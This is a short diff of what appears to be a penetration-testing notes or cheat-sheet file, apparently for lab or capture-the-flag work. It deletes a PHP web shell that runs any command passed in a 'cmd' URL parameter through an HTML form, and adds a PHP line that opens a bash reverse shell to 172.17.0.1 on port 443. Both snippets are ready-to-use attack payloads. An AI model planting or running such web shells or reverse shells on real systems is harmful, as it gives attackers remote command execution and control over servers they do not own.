@@ -5,15 +5,9 @@ gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.
 
 
 --- php ---
-echo '<?php        
-if(isset($_GET['cmd'])) {
-    system($_GET['cmd']);
-}
+<?php
+system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
 ?>
-<form method="GET">
-    <input type="text" name="cmd" placeholder="Escribe tu comando aquí" style="width:400px">
-    <input type="submit" value="Ejecutar">
-</form>' > script.php
 ---
 
 
